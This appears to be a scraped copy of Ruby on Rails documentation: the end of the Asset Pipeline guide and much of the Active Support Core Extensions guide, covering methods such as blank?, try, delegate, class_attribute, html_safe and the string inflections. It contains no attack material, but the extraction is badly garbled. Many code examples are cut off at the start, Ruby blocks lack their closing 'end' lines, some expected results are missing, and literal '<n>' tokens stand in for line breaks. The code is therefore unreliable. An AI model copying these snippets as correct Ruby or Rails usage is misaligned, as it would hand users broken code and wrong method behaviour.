Normally, you would subclass `Tilt::Template` and<n>reimplement the `prepare` method, which initializes your template, and the<n>`evaluate` method, which returns the processed source. 
The original source is<n>stored in `data`. 
module BangBang
  class Template < ::Tilt::Template
    def prepare
      # Do any initialization here
    # Adds a "!" to original template.
    def evaluate(scope, locals, &block)
      "#{data}!"
Now that you have a `Template` class, it's time to associate it with an<n>extension for template files:
Sprockets.register_engine '.bang', BangBang::Template
Upgrading from Old Versions of Rails
There are a few issues when upgrading from Rails 3.0 or Rails 2.x. 
The first is<n>moving the files from `public/` to the new locations. 
See [Asset<n>Organization](#asset-organization) above for guidance on the correct locations<n>for different file types.
Next will be avoiding duplicate JavaScript files. 
Since jQuery is the default<n>JavaScript library from Rails 3.1 onwards, you don't need to copy `jquery.js`<n>into `app/assets` and it will be included automatically.
The third is updating the various environment files with the correct default<n>options.
In `application.rb`:
# Version of your assets, change this if you want to expire all your assets
# Change the path that assets are served from config.assets.prefix = "/assets"
In `development.rb`:
# Expands the lines which load the assets
And in `production.rb`:
# Choose the compressors to use (if any) config.assets.js_compressor  =
# :uglifier config.assets.css_compressor = :yui
# Generate digests for assets URLs. 
This is planned for deprecation.
# Precompile additional assets (application.js, application.css, and all
# non-JS/CSS are already added) config.assets.precompile += %w( search.js )
Rails 4 no longer sets default config values for Sprockets in `test.rb`, so<n>`test.rb` now requires Sprockets configuration. 
The old defaults in the test<n>environment are: `config.assets.compile = true`, `config.assets.compress = false`,<n>`config.assets.debug = false` and `config.assets.digest = false`.
The following should also be added to `Gemfile`:
gem 'sass-rails',   "~> 3.2.3"
gem 'coffee-rails', "~> 3.2.1"
Active Support Core Extensions
Active Support is the Ruby on Rails component responsible for providing Ruby language extensions, utilities, and other transversal stuff.
It offers a richer bottom-line at the language level, targeted both at the development of Rails applications, and at the development of Ruby on Rails itself.
* What Core Extensions are.
* How to load all extensions.
* How to cherry-pick just the extensions you want.
* What extensions Active Support provides.
How to Load Core Extensions
### Stand-Alone Active Support
In order to have a near-zero default footprint, Active Support does not load anything by default. 
It is broken in small pieces so that you can load just what you need, and also has some convenience entry points to load related extensions in one shot, even everything.
Thus, after a simple require like:
require 'active_support'
objects do not even respond to `blank?`. 
Let's see how to load its definition.
#### Cherry-picking a Definition
The most lightweight way to get `blank?` is to cherry-pick the file that defines it.
For every single method defined as a core extension this guide has a note that says where such a method is defined. 
In the case of `blank?` the note reads:
NOTE: Defined in `active_support/core_ext/object/blank.rb`.
That means that you can require it like this:
require 'active_support/core_ext/object/blank'
Active Support has been carefully revised so that cherry-picking a file loads only strictly needed dependencies, if any.
#### Loading Grouped Core Extensions
The next level is to simply load all extensions to `Object`. 
As a rule of thumb, extensions to `SomeClass` are available in one shot by loading `active_support/core_ext/some_class`.
Thus, to load all extensions to `Object` (including `blank?`):
require 'active_support/core_ext/object'
#### Loading All Core Extensions
You may prefer just to load all core extensions, there is a file for that:
require 'active_support/core_ext'
#### Loading All Active Support
And finally, if you want to have all Active Support available just issue:
require 'active_support/all'
That does not even put the entire Active Support in memory upfront indeed, some stuff is configured via `autoload`, so it is only loaded if used.
### Active Support Within a Ruby on Rails Application
In that case, the application will only load what the framework itself cherry-picks for its own needs, and can still cherry-pick itself at any granularity level, as explained in the previous section.
Extensions to All Objects
### `blank?` and `present?`
The following values are considered to be blank in a Rails application:
* `nil` and `false`,
* strings composed only of whitespace (see note below),
* empty arrays and hashes, and
* any other object that responds to `empty?` and is empty.
INFO: The predicate for strings uses the Unicode-aware character class `[:space:]`, so for example U+2029 (paragraph separator) is considered to be whitespace.
WARNING: Note that numbers are not mentioned. 
In particular, 0 and 0.0 are **not** blank.
For example, this method from `ActionController::HttpAuthentication::Token::ControllerMethods` uses `blank?` for checking whether a token is present:
def authenticate(controller, &login_procedure)
  token, options = token_and_options(controller.request)
  unless token.blank?
    login_procedure.call(token, options)
The method `present?` is equivalent to `!blank?`. 
This example is taken from `ActionDispatch::Http::Cache::Response`:
def set_conditional_cache_control!
  return if self["Cache-Control"].present?
The `presence` method returns its receiver if `present?`, and `nil` otherwise. 
It is useful for idioms like this:
host = config[:host].presence || 'localhost'
### `duplicable?
A few fundamental objects in Ruby are singletons. 
For example, in the whole life of a program the integer 1 refers always to the same instance:
1.object_id                 # => 3
Math.cos(0).to_i.object_id  # => 3
Hence, there's no way these objects can be duplicated through `dup` or `clone`:
true.dup  # => TypeError: can't dup TrueClass
Some numbers which are not singletons are not duplicable either:
0.0.clone        # => allocator undefined for Float
(2**1024).clone  # => allocator undefined for Bignum
Active Support provides `duplicable?` to programmatically query an object about this property:
"foo".duplicable? 
"".duplicable?    
false.duplicable? 
By definition all objects are `duplicable?` except `nil`, `false`, `true`, symbols, numbers, class, module, and method objects.
WARNING: Any class can disallow duplication by removing `dup` and `clone` or raising exceptions from them. 
Thus only `rescue` can tell whether a given arbitrary object is duplicable. 
`duplicable?` depends on the hard-coded list above, but it is much faster than `rescue`. 
Use it only if you know the hard-coded list is enough in your use case.
NOTE: Defined in `active_support/core_ext/object/duplicable.rb`.
### `deep_dup`
The `deep_dup` method returns deep copy of a given object. 
Normally, when you `dup` an object that contains other objects, Ruby does not `dup` them, so it creates a shallow copy of the object. 
If you have an array with a string, for example, it will look like this:
array     = ['string']
duplicate = array.dup
duplicate.push 'another-string'
# the object was duplicated, so the element was added only to the duplicate
array     # => ['string']
duplicate # => ['string', 'another-string']
string', 'foo')
# first element was not duplicated, it will be changed in both arrays
array     # => ['foo']
duplicate # => ['foo', 'another-string']
As you can see, after duplicating the `Array` instance, we got another object, therefore we can modify it and the original object will stay unchanged. 
This is not true for array's elements, however. 
Since `dup` does not make deep copy, the string inside the array is still the same object.
If you need a deep copy of an object, you should use `deep_dup`. 
Here is an example:
duplicate = array.deep_dup
duplicate # => ['foo']
If the object is not duplicable, `deep_dup` will just return it:
number = 1
duplicate = number.deep_dup
number.object_id == duplicate.object_id   # => true
NOTE: Defined in `active_support/core_ext/object/deep_dup.rb`.
### `try`
When you want to call a method on an object only if it is not `nil`, the simplest way to achieve it is with conditional statements, adding unnecessary clutter. 
The alternative is to use `try`. `try` is like `Object#send` except that it returns `nil` if sent to `nil`.
# without try
unless @number.nil?
  @number.next
# with try
@number.try(:next)
Another example is this code from `ActiveRecord::ConnectionAdapters::AbstractAdapter` where `@logger` could be `nil`. 
You can see that the code uses `try` and avoids an unnecessary check.
def log_info(sql, name, ms)
  if @logger.try(:debug?)
    name = '%s (%.1fms)' % [name || 'SQL', ms]
    @logger.debug(format_log_entry(name, sql.squeeze(' ')))
`try` can also be called without arguments but a block, which will only be executed if the object is not nil:
NOTE: Defined in `active_support/core_ext/object/try.rb`.
### `class_eval(*args, &block)`
You can evaluate code in the context of any object's singleton class using `class_eval`:
class Proc
  def bind(object)
    block, time = self, Time.current
    object.class_eval do
      method_name = "__bind_#{time.to_i}_#{time.usec}"
      define_method(method_name, &block)
      method = instance_method(method_name)
      remove_method(method_name)
      method
    end.bind(object)
NOTE: Defined in `active_support/core_ext/kernel/singleton_class.rb`.
### `acts_like?(
The method `acts_like?` provides a way to check whether some class acts like some other class based on a simple convention: a class that provides the same interface as `String` defines
def acts_like_string?
which is only a marker, its body or return value are irrelevant. 
Then, client code can query for duck-type-safeness this way:
some_klass.acts_like?(:string)
Rails has classes that act like `Date` or `Time` and follow this contract.
NOTE: Defined in `active_support/core_ext/object/acts_like.rb`.
### `to_param`
All objects in Rails respond to the method `to_param`, which is meant to return something that represents them as values in a query string, or as URL fragments.
By default `to_param` just calls `to_s`:
7.to_param # => "7"
The return value of `to_param` should **not** be escaped:
"Tom & Jerry".to_param # => "Tom & Jerry"
Several classes in Rails overwrite this method.
For example `nil`, `true`, and `false` return themselves. 
`Array#to_param` calls `to_param` on the elements and joins the result with "/":
[0, true, String].to_param # => "0/true/String"
Notably, the Rails routing system calls `to_param` on models to get a value for the `:id` placeholder. 
`ActiveRecord::Base#to_param` returns the `id` of a model, but you can redefine that method in your models. 
class User
  def to_param
    "#{id}-#{name.parameterize}"
we get:
user_path(@user) # => "/users/357-john-smith"
WARNING. Controllers need to be aware of any redefinition of `to_param` because when a request like that comes in "357-john-smith" is the value of `params[:id]`.
NOTE: Defined in `active_support/core_ext/object/to_param.rb`.
### `to_query`
Except for hashes, given an unescaped `key` this method constructs the part of a query string that would map such key to what `to_param` returns. 
For example, given
This method escapes whatever is needed, both for the key and the value:
account.to_query('company[name]')
# => "company%5Bname%5D=Johnson+%26+Johnson"
so its output is ready to be used in a query string.
Arrays return the result of applying `to_query` to each element with `_key_[]` as key, and join the result with "&":
[3.4, -45.6].to_query('sample')
# => "sample%5B%5D=3.4&sample%5B%5D=-45.6"
Hashes also respond to `to_query` but with a different signature. 
If no argument is passed a call generates a sorted series of key/value assignments calling `to_query(key)` on its values. 
Then it joins the result with "&":
{c: 3, b: 2, a: 1}.to_query # => "a=1&b=2&c=3"
The method `Hash#to_query` accepts an optional namespace for the keys:
{id: 89, name: "John Smith"}.to_query('user')
# => "user%5Bid%5D=89&user%5Bname%5D=John+Smith"
NOTE: Defined in `active_support/core_ext/object/to_query.rb`.
### `with_options`
The method `with_options` provides a way to factor out common options in a series of method calls.
Given a default options hash, `with_options` yields a proxy object to a block. 
Within the block, methods called on the proxy are forwarded to the receiver with their options merged. 
For example, you get rid of the duplication in:
  has_many :customers, dependent: :destroy
  has_many :products,  dependent: :destroy
  has_many :invoices,  dependent: :destroy
  has_many :expenses,  dependent: :destroy
this way:
  with_options dependent: :destroy do |assoc|
    assoc.has_many :customers
    assoc.has_many :products
    assoc.has_many :invoices
    assoc.has_many :expenses
That idiom may convey _grouping_ to the reader as well. 
For example, say you want to send a newsletter whose language depends on the user. 
Somewhere in the mailer you could group locale-dependent bits like this:
I18n.with_options locale: user.locale, scope: "newsletter" do |i18n|
  subject i18n.t :subject
  body    i18n.t :body, user_name: user.name
TIP: Since `with_options` forwards calls to its receiver they can be nested. 
Each nesting level will merge inherited defaults in addition to their own.
NOTE: Defined in `active_support/core_ext/object/with_options.rb`.
### JSON support
Active Support provides a better implementation of `to_json` than the `json` gem ordinarily provides for Ruby objects. 
This is because some classes, like `Hash`, `OrderedHash` and `Process::Status` need special handling in order to provide a proper JSON representation.
NOTE: Defined in `active_support/core_ext/object/json.rb`.
### Instance Variables
Active Support provides several methods to ease access to instance variables.
#### `instance_values`
The method `instance_values` returns a hash that maps instance variable names without "@" to their<n>corresponding values. 
Keys are strings:
class C
  def initialize(x, y)
    @x, @y = x, y
C.new(0, 1).instance_values # => {"x" => 0, "y" => 1}
NOTE: Defined in `active_support/core_ext/object/instance_variables.rb`.
#### `instance_variable_names`
The method `instance_variable_names` returns an array.  
Each name includes the "@" sign.
C.new(0, 1).instance_variable_names # => ["@x", "@y"]
The methods `silence_warnings` and `enable_warnings` change the value of `$VERBOSE` accordingly for the duration of their block, and reset it afterwards:
silence_warnings { Object.const_set "RAILS_DEFAULT_LOGGER", logger }
Silencing exceptions is also possible with `suppress`. 
This method receives an arbitrary number of exception classes. 
If an exception is raised during the execution of the block and is `kind_of?` any of the arguments, `suppress` captures it and returns silently. 
Otherwise the exception is reraised:
# If the user is locked the increment is lost, no big deal.
suppress(ActiveRecord::StaleObjectError) do
  current_user.increment! :visits
NOTE: Defined in `active_support/core_ext/kernel/reporting.rb`.
### `in?
The predicate `in?` tests if an object is included in another object. 
An `ArgumentError` exception will be raised if the argument passed does not respond to `include?`.
Examples of `in?`:
1,2])        # => true
hello")   # => true
30..50)      # => false
1)            # => ArgumentError
NOTE: Defined in `active_support/core_ext/object/inclusion.rb`.
Extensions to `Module`
### `alias_method_chain`
Using plain Ruby you can wrap methods with other methods, that's called _alias chaining_.
For example, let's say you'd like params to be strings in functional tests, as they are in real requests, but still want the convenience of assigning integers and other kind of values. 
To accomplish that you could wrap `ActionController::TestCase#process` this way in `test/test_helper.rb`:
ActionController::TestCase.class_eval do
  # save a reference to the original process method
  alias_method :original_process, :process
  def process(action, params=nil, session=nil, flash=nil, http_method='GET')
    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]
    original_process(action, params, session, flash, http_method)
That's the method `get`, `post`, etc., delegate the work to.
That technique has a risk, it could be the case that `:original_process` was taken. 
To try to avoid collisions people choose some label that characterizes what the chaining is about:
  def process_with_stringified_params(...)
    process_without_stringified_params(action, params, session, flash, http_method)
  alias_method :process_without_stringified_params, :process
  alias_method :process, :process_with_stringified_params
The method `alias_method_chain` provides a shortcut for that pattern:
  alias_method_chain :process, :stringified_params
NOTE: Defined in `active_support/core_ext/module/aliasing.rb`.
### Attributes
#### `alias_attribute`
Model attributes have a reader, a writer, and a predicate. 
You can alias a model attribute having the corresponding three methods defined for you in one shot. 
As in other aliasing methods, the new name is the first argument, and the old name is the second (one mnemonic is that they go in the same order as if you did an assignment):
  # You can refer to the email column as "login".
  # This can be meaningful for authentication code.
#### Internal Attributes
When you are defining an attribute in a class that is meant to be subclassed, name collisions are a risk. 
That's remarkably important for libraries.
Active Support defines the macros `attr_internal_reader`, `attr_internal_writer`, and `attr_internal_accessor`. 
They behave like their Ruby built-in `attr_*` counterparts, except they name the underlying instance variable in a way that makes collisions less likely.
The macro `attr_internal` is a synonym for `attr_internal_accessor`:
# library
class ThirdPartyLibrary::Crawler
  attr_internal :log_level
# client code
class MyCrawler < ThirdPartyLibrary::Crawler
  attr_accessor :log_level
In the previous example it could be the case that `:log_level` does not belong to the public interface of the library and it is only used for development. 
The client code, unaware of the potential conflict, subclasses and defines its own `:log_level`. 
By default the internal instance variable is named with a leading underscore, `@_log_level` in the example above. 
That's configurable via `Module.attr_internal_naming_format` though, you can pass any `sprintf`-like format string with a leading `@` and a `%s` somewhere, which is where the name will be placed. 
The default is `"@_%s"`.
Rails uses internal attributes in a few spots, for examples for views:
module ActionView
  class Base
    attr_internal :captures
    attr_internal :request, :layout
    attr_internal :controller, :template
NOTE: Defined in `active_support/core_ext/module/attr_internal.rb`.
#### Module Attributes
The macros `mattr_reader`, `mattr_writer`, and `mattr_accessor` are the same as the `cattr_*` macros defined for class. 
In fact, the `cattr_*` macros are just aliases for the `mattr_*` macros. 
Check [Class Attributes](#class-attributes).
For example, the dependencies mechanism uses them:
module ActiveSupport
  module Dependencies
    mattr_accessor :warnings_on_first_load
    mattr_accessor :history
    mattr_accessor :loaded
    mattr_accessor :mechanism
    mattr_accessor :load_paths
    mattr_accessor :load_once_paths
    mattr_accessor :autoloaded_constants
    mattr_accessor :explicitly_unloadable_constants
    mattr_accessor :logger
    mattr_accessor :log_activity
    mattr_accessor :constant_watch_stack
    mattr_accessor :constant_watch_stack_mutex
NOTE: Defined in `active_support/core_ext/module/attribute_accessors.rb`.
### Parents
#### `parent`
The `parent` method on a nested named module returns the module that contains its corresponding constant:
module X
  module Y
    module Z
M = X::Y::Z
X::Y::Z.parent # => X::Y
M.parent       # => X::Y
If the module is anonymous or belongs to the top-level, `parent` returns `Object`.
WARNING: Note that in that case `parent_name` returns `nil`.
NOTE: Defined in `active_support/core_ext/module/introspection.rb`.
#### `parent_name`
The `parent_name` method on a nested named module returns the fully-qualified name of the module that contains its corresponding constant:
X::Y::Z.parent_name # => "X::Y"
M.parent_name       # => "X::Y"
For top-level or anonymous modules `parent_name` returns `nil`.
WARNING: Note that in that case `parent` returns `Object`.
NOTE: Defined in `active_support/core_ext/module/introspection.rb`.
#### `parents`
The method `parents` calls `parent` on the receiver and upwards until `Object` is reached. 
The chain is returned in an array, from bottom to top:
X::Y::Z.parents # => [X::Y, X, Object]
M.parents       # => [X::Y, X, Object]
### Constants
The method `local_constants` returns the names of the constants that have been<n>defined in the receiver module:
  X1 = 1
  X2 = 2
    Y1 = :y1
    X1 = :overrides_X1_above
X.local_constants    # => [:X1, :X2, :Y]
X::Y.local_constants # => [:Y1, :X1]
The names are returned as symbols.
#### Qualified Constant Names
Active Support extends this API to be able to pass<n>relative qualified constant names.
The new methods are `qualified_const_defined?`, `qualified_const_get`, and<n>`qualified_const_set`. 
Their arguments are assumed to be qualified constant<n>names relative to their receiver:
Object.qualified_const_defined?("Math::PI")       # => true
Object.qualified_const_get("Math::PI")            # => 3.141592653589793
Object.qualified_const_set("Math::Phi", 1.618034) # => 1.618034
Arguments may be bare constant names:
Math.qualified_const_get("E") # => 2.718281828459045
These methods are analogous to their built-in counterparts. 
In particular,<n>`qualified_constant_defined?` accepts an optional second argument to be<n>able to say whether you want the predicate to look in the ancestors.
This flag is taken into account for each constant in the expression while<n>walking down the path.
For example, given
module M
  X = 1
module N
  class C
    include M
`qualified_const_defined?` behaves this way:
C::X", false) # => false
C::X", true)  # => true
C::X")        # => true
As the last example implies, the second argument defaults to true,<n>as in `const_defined?`.
For coherence with the built-in methods only relative paths are accepted.
Absolute qualified constant names like `::Math::PI` raise `NameError`.
NOTE: Defined in `active_support/core_ext/module/qualified_const.rb`.
### Reachable
A named module is reachable if it is stored in its corresponding constant. 
It means you can reach the module object via the constant.
That is what ordinarily happens, if a module is called "M", the `M` constant exists and holds it:
M.reachable? 
But since constants and modules are indeed kind of decoupled, module objects can become unreachable:
orphan = Object.send(:remove_const, :M)
# The module object is orphan now but it still has a name.
orphan.name # => "M"
# You cannot reach it via the constant M because it does not even exist.
orphan.reachable? 
# Let's define a module called "M" again.
# The constant M exists now again, and it stores a module
# object called "M", but it is a new instance.
NOTE: Defined in `active_support/core_ext/module/reachable.rb`.
### Anonymous
A module may or may not have a name:
M.name # => "M"
N = Module.new
N.name # => "N"
Module.new.name # => nil
You can check whether a module has a name with the predicate `anonymous?`:
Module.new.anonymous? 
Note that being unreachable does not imply being anonymous:
m = Object.send(:remove_const, :M)
m.reachable? 
m.anonymous? 
though an anonymous module is unreachable by definition.
NOTE: Defined in `active_support/core_ext/module/anonymous.rb`.
### Method Delegation
The macro `delegate` offers an easy way to forward methods.
Let's imagine that users in some application have login information in the `User` model but name and other data in a separate `Profile` model:
  has_one :profile
With that configuration you get a user's name via their profile, `user.profile.name`, but it could be handy to still be able to access such attribute directly:
    profile.name
That is what `delegate` does for you:
  delegate :name, to: :profile
It is shorter, and the intention more obvious.
The method must be public in the target.
The `delegate` macro accepts several methods:
delegate :name, :age, :address, :twitter, to: :profile
When interpolated into a string, the `:to` option should become an expression that evaluates to the object the method is delegated to. 
Typically a string or symbol. 
Such an expression is evaluated in the context of the receiver:
# delegates to the Rails constant
delegate :logger, to: :Rails
# delegates to the receiver's class
delegate :table_name, to: :class
WARNING: If the `:prefix` option is `true` this is less generic, see below.
By default, if the delegation raises `NoMethodError` and the target is `nil` the exception is propagated. 
You can ask that `nil` is returned instead with the `:allow_nil` option:
delegate :name, to: :profile, allow_nil: true
With `:allow_nil` the call `user.name` returns `nil` if the user has no profile.
The option `:prefix` adds a prefix to the name of the generated method. 
This may be handy for example to get a better name:
delegate :street, to: :address, prefix: true
The previous example generates `address_street` rather than `street`.
WARNING: Since in this case the name of the generated method is composed of the target object and target method names, the `:to` option must be a method name.
A custom prefix may also be configured:
delegate :size, to: :attachment, prefix: :avatar
In the previous example the macro generates `avatar_size` rather than `size`.
NOTE: Defined in `active_support/core_ext/module/delegation.rb`
### Redefining Methods
There are cases where you need to define a method with `define_method`, but don't know whether a method with that name already exists. 
If it does, a warning is issued if they are enabled. 
No big deal, but not clean either.
The method `redefine_method` prevents such a potential warning, removing the existing method before if needed.
NOTE: Defined in `active_support/core_ext/module/remove_method.rb`
Extensions to `Class`
### Class Attributes
#### `class_attribute`
The method `class_attribute` declares one or more inheritable class attributes that can be overridden at any level down the hierarchy.
  class_attribute :x
class B < A; end
class C < B; end
A.x = :a
B.x # => :a
C.x # => :a
B.x = :b
A.x # => :a
C.x # => :b
C.x = :c
B.x # => :b
For example `ActionMailer::Base` defines:
class_attribute :default_params
self.default_params = {
  mime_version: "1.0",
  charset: "UTF-8",
  content_type: "text/plain",
  parts_order: [ "text/plain", "text/enriched", "text/html" ]
}.freeze
They can also be accessed and overridden at the instance level.
A.x = 1
a1 = A.new
a2 = A.new
a2.x = 2
a1.x # => 1, comes from A
a2.x # => 2, overridden in a2
The generation of the writer instance method can be prevented by setting the option `:instance_writer` to `false`.
module ActiveRecord
    class_attribute :table_name_prefix, instance_writer: false
    self.table_name_prefix = ""
A model may find that option useful as a way to prevent mass-assignment from setting the attribute.
The generation of the reader instance method can be prevented by setting the option `:instance_reader` to `false`.
  class_attribute :x, instance_reader: false
A.new.x = 1 # NoMethodError
For convenience `class_attribute` also defines an instance predicate which is the double negation of what the instance reader returns. 
In the examples above it would be called `x?`.
When `:instance_reader` is `false`, the instance predicate returns a `NoMethodError` just like the reader method.
If you do not want the instance predicate, pass `instance_predicate: false` and it will not be defined.
NOTE: Defined in `active_support/core_ext/class/attribute.rb`
#### `cattr_reader`, `cattr_writer`, and `cattr_accessor`
The macros `cattr_reader`, `cattr_writer`, and `cattr_accessor` are analogous to their `attr_*` counterparts but for classes. 
They initialize a class variable to `nil` unless it already exists, and generate the corresponding class methods to access it:
class MysqlAdapter < AbstractAdapter
  # Generates class methods to access @@emulate_booleans.
  cattr_accessor :emulate_booleans
  self.emulate_booleans = true
Instance methods are created as well for convenience, they are just proxies to the class attribute. 
So, instances can change the class attribute, but cannot override it as it happens with `class_attribute` (see above). 
For example given
    cattr_accessor :field_error_proc
    @@field_error_proc = Proc.new{ ... }
we can access `field_error_proc` in views.
Also, you can pass a block to `cattr_*` to set up the attribute with a default value:
  # Generates class methods to access @@emulate_booleans with default value of true.
  cattr_accessor(:emulate_booleans) { true }
The generation of the reader instance method can be prevented by setting `:instance_reader` to `false` and the generation of the writer instance method can be prevented by setting `:instance_writer` to `false`. 
Generation of both methods can be prevented by setting `:instance_accessor` to `false`. 
In all cases, the value must be exactly `false` and not any false value.
module A
  class B
    # No first_name instance reader is generated.
    cattr_accessor :first_name, instance_reader: false
    # No last_name= instance writer is generated.
    cattr_accessor :last_name, instance_writer: false
    # No surname instance reader or surname= writer is generated.
    cattr_accessor :surname, instance_accessor: false
A model may find it useful to set `:instance_accessor` to `false` as a way to prevent mass-assignment from setting the attribute.
### Subclasses & Descendants
#### `subclasses`
The `subclasses` method returns the subclasses of the receiver:
class C; end
C.subclasses # => []
class B < C; end
C.subclasses # => [B]
class A < B; end
class D < C; end
C.subclasses # => [B, D]
The order in which these classes are returned is unspecified.
NOTE: Defined in `active_support/core_ext/class/subclasses.rb`.
#### `descendants`
The `descendants` method returns all classes that are `<` than its receiver:
C.descendants # => []
C.descendants # => [B]
C.descendants # => [B, A]
C.descendants # => [B, A, D]
Extensions to `String`
### Output Safety
#### Motivation
Inserting data into HTML templates needs extra care. 
For example, you can't just interpolate `@review.title` verbatim into an HTML page. 
For one thing, if the review title is "Flanagan & Matz rules!" the output won't be well-formed because an ampersand has to be escaped as "&amp;amp;". 
What's more, depending on the application, that may be a big security hole because users can inject malicious HTML setting a hand-crafted review title. 
Check out the section about cross-site scripting in the [Security guide](security.html#cross-site-scripting-xss) for further information about the risks.
#### Safe Strings
Active Support has the concept of _(html) safe_ strings. 
A safe string is one that is marked as being insertable into HTML as is. 
It is trusted, no matter whether it has been escaped or not.
Strings are considered to be _unsafe_ by default:
"".html_safe? 
You can obtain a safe string from a given one with the `html_safe` method:
s = "".html_safe
s.html_safe? 
It is important to understand that `html_safe` performs no escaping whatsoever, it is just an assertion:
s = "<script>...</script>".html_safe
s            # => "<script>...</script>"
It is your responsibility to ensure calling `html_safe` on a particular string is fine.
If you append onto a safe string, either in-place with `concat`/`<<`, or with `+`, the result is a safe string. 
Unsafe arguments are escaped:
"".html_safe + "<" # => "&lt;"
Safe arguments are directly appended:
"".html_safe + "<".html_safe # => "<"
These methods should not be used in ordinary views. 
Unsafe values are automatically escaped:
<%= @review.title %> <%# fine, escaped if needed %>
To insert something verbatim use the `raw` helper rather than calling `html_safe`:
<%= raw @cms.current_template %> <%# inserts @cms.current_template as is %>
or, equivalently, use `<%==`:
<%== @cms.current_template %> <%# inserts @cms.current_template as is %>
The `raw` helper calls `html_safe` for you:
def raw(stringish)
  stringish.to_s.html_safe
NOTE: Defined in `active_support/core_ext/string/output_safety.rb`.
#### Transformation
As a rule of thumb, except perhaps for concatenation as explained above, any method that may change a string gives you an unsafe string. 
These are `downcase`, `gsub`, `strip`, `chomp`, `underscore`, etc.
In the case of in-place transformations like `gsub!` the receiver itself becomes unsafe.
INFO: The safety bit is lost always, no matter whether the transformation actually changed something.
#### Conversion and Coercion
Calling `to_s` on a safe string returns a safe string, but coercion with `to_str` returns an unsafe string.
#### Copying
Calling `dup` or `clone` on safe strings yields safe strings.
### `remove`
The method `remove` will remove all occurrences of the pattern:
Hello World"
There's also the destructive version `String#remove!`.
NOTE: Defined in `active_support/core_ext/string/filters.rb`.
### `squish`
The method `squish` strips leading and trailing whitespace, and substitutes runs of whitespace with a single space each:
" \n  foo\n\r \t bar \n".squish # => "foo bar"
There's also the destructive version `String#squish!`.
Note that it handles both ASCII and Unicode whitespace.
### `truncate`
The method `truncate` returns a copy of its receiver truncated after a given `length`:
"Oh dear! Oh dear! 
I shall be late!".truncate(20)
# => "Oh dear! 
Oh dear!..."
Ellipsis can be customized with the `:omission` option:
I shall be late!".truncate(20, omission: '&hellip;')
Oh &hellip;"
Note in particular that truncation takes into account the length of the omission string.
Pass a `:separator` to truncate the string at a natural break:
I shall be late!".truncate(18)
Oh dea..."
I shall be late!".truncate(18, separator: ' ')
Oh..."
The option `:separator` can be a regexp:
I shall be late!".truncate(18, separator: /\s/)
In above examples "dear" gets cut first, but then `:separator` prevents it.
### `truncate_words`
The method `truncate_words` returns a copy of its receiver truncated after a given number of words:
I shall be late!".truncate_words(4)
I shall be late!".truncate_words(4, omission: '&hellip;')
Oh dear!
I shall be late!".truncate_words(3, separator: '!')
Oh dear! 
I shall be late..."
I shall be late!".truncate_words(4, separator: /\s/)
### `inquiry`
The `inquiry` method converts a string into a `StringInquirer` object making equality checks prettier.
"production".inquiry.production? 
"active".inquiry.inactive?       
### `starts_with?` and `ends_with?`
Active Support defines 3rd person aliases of `String#start_with?` and `String#end_with?`:
f") # => true
o")   # => true
NOTE: Defined in `active_support/core_ext/string/starts_ends_with.rb`.
### `strip_heredoc`
The method `strip_heredoc` strips indentation in heredocs.
For example in
if options[:usage]
  puts <<-USAGE.strip_heredoc
    This command does such and such.
    Supported options are:
      -h         This message
      ...
  USAGE
the user would see the usage message aligned against the left margin.
Technically, it looks for the least indented line in the whole string, and removes<n>that amount of leading whitespace.
NOTE: Defined in `active_support/core_ext/string/strip.rb`.
### `indent`
Indents the lines in the receiver:
<<EOS.indent(2)
def some_method
  some_code
  def some_method
    some_code
The second argument, `indent_string`, specifies which indent string to use. 
The default is `nil`, which tells the method to make an educated guess peeking at the first indented line, and fallback to a space if there is none.
"  foo".indent(2)        # => "    foo"
"foo\n\t\tbar".indent(2) # => "\t\tfoo\n\t\t\t\tbar"
"foo".indent(2, "\t")    # => "\t\tfoo"
While `indent_string` is typically one space or tab, it may be any string.
The third argument, `indent_empty_lines`, is a flag that says whether empty lines should be indented. 
Default is false.
"foo\n\nbar".indent(2)            # => "  foo\n\n  bar"
"foo\n\nbar".indent(2, nil, true) # => "  foo\n  \n  bar"
The `indent!` method performs indentation in-place.
NOTE: Defined in `active_support/core_ext/string/indent.rb`.
### Access
#### `at(position)`
Returns the character of the string at position `position`:
"hello".at(0)  # => "h"
"hello".at(4)  # => "o"
"hello".at(-1) # => "o"
"hello".at(10) # => nil
NOTE: Defined in `active_support/core_ext/string/access.rb`.
#### `from(position)`
Returns the substring of the string starting at position `position`:
"hello".from(0)  # => "hello"
"hello".from(2)  # => "llo"
"hello".from(-2) # => "lo"
#### `to(position)`
Returns the substring of the string up to position `position`:
"hello".to(0)  # => "h"
"hello".to(2)  # => "hel"
"hello".to(-2) # => "hell"
"hello".to(10) # => "hello"
#### `first(limit = 1)`
The call `str.first(n)` is equivalent to `str.to(n-1)` if `n` > 0, and returns an empty string for `n` == 0.
#### `last(limit = 1)`
### Inflections
#### `pluralize`
The method `pluralize` returns the plural of its receiver:
"table".pluralize     # => "tables"
"ruby".pluralize      # => "rubies"
"equipment".pluralize # => "equipment"
As the previous example shows, Active Support knows some irregular plurals and uncountable nouns. 
Built-in rules can be extended in `config/initializers/inflections.rb`. 
That file is generated by the `rails` command and has instructions in comments.
`pluralize` can also take an optional `count` parameter. 
For any other value of `count` the plural form will be returned:
"dude".pluralize(0) # => "dudes"
"dude".pluralize(1) # => "dude"
"dude".pluralize(2) # => "dudes"
Active Record uses this method to compute the default table name that corresponds to a model:
# active_record/model_schema.rb
def undecorated_table_name(class_name = base_class.name)
  table_name = class_name.to_s.demodulize.underscore
  pluralize_table_names ? 
table_name.pluralize : table_name
NOTE: Defined in `active_support/core_ext/string/inflections.rb`.
#### `singularize`
The inverse of `pluralize`:
"tables".singularize    # => "table"
"rubies".singularize    # => "ruby"
"equipment".singularize # => "equipment"
Associations compute the name of the corresponding default associated class using this method:
# active_record/reflection.rb
def derive_class_name
  class_name = name.to_s.camelize
  class_name = class_name.singularize if collection?
  class_name
#### `camelize`
The method `camelize` returns its receiver in camel case:
"product".camelize    # => "Product"
"admin_user".camelize # => "AdminUser"
As a rule of thumb you can think of this method as the one that transforms paths into Ruby class or module names, where slashes separate namespaces:
"backoffice/session".camelize # => "Backoffice::Session"
For example, Action Pack uses this method to load the class that provides a certain session store:
# action_controller/metal/session_management.rb
def session_store=(store)
  @@session_store = store.is_a?(
Symbol) ?
    ActionDispatch::Session.const_get(store.to_s.camelize) :
    store
`camelize` accepts an optional argument, it can be `:upper` (default), or `:lower`. 
With the latter the first letter becomes lowercase:
"visual_effect".camelize(:lower) # => "visualEffect"
That may be handy to compute method names in a language that follows that convention, for example JavaScript.
